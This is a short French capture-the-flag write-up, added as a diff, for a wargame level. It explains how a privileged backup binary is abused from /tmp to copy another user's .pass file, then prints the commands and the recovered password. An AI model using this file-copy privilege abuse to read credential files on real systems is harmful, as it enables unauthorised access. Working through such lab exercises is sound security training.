@@ -1,0 +1,16 @@
+le binaire semble est un outil de backup,
+on se rends vite compte que lors du open() du ficheir de destination, le binaire
+met des permissions stickybit pour l'user level09
+
+on viens donc se placer dans le seul dossier ou l'on peut ecrire:
+cd /tmp
+
+et on prepare le dossier backup:
+mkdir -pv /tmp/backups/home/users/level09
+
+puis on  lance:
+~/level08 /home/users/level09/.pass
+
+il ne reste plus qu a recup le fichier fraichement copie:
+cat /tmp/backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
